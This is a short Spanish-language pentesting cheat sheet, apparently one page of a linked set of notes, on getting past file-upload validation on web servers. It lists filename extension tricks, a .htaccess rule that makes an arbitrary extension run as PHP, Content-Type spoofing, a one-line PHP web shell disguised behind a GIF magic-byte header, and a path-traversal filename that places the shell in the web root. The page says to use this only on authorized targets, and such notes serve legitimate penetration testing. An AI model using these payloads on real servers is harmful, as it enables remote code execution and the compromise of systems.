# File Upload — Bypass de validaciones

Ver índice: [file-upload.md](file-upload.md). **Solo sobre objetivos autorizados.**

## Método

Averigua **qué** valida (extensión, Content-Type, magic bytes, tamaño) probando de una en una, y ataca la comprobación más débil.

## Bypass de extensión

```
shell.php   shell.phtml   shell.php5   shell.php7   shell.phar
shell.pHp                       # mayúsculas si es case-sensitive
shell.php.jpg    shell.jpg.php  # dobles extensiones
shell.php%00.jpg               # null byte (legacy)
shell.php.       shell.php;.jpg # trailing / punto y coma
shell.php::$DATA               # ADS en Windows/IIS
```

## .htaccess / web.config

Si puedes subir config, fuerza que se ejecuten otras extensiones:
```apache
# .htaccess (Apache)
AddType application/x-httpd-php .xyz
```

## Bypass de Content-Type

En la request multipart, cambia la cabecera del fichero:
```
Content-Type: image/png       (aunque el contenido sea PHP)
```

## Bypass de magic bytes (content sniffing)

Antepón una cabecera de imagen válida al payload:
```
GIF89a;
<?php system($_GET['c']); ?>
```
(También `\xFF\xD8\xFF` para JPEG, `%PDF-` para PDF, etc.)

## Nombre con path traversal

```
../../var/www/html/shell.php   # sacar el fichero de la carpeta de subidas
```

## Notas

- Muchas defensas validan solo una cosa; combina bypasses (extensión + magic bytes + Content-Type).
- Tras subir, ve a [to-rce.md](to-rce.md).
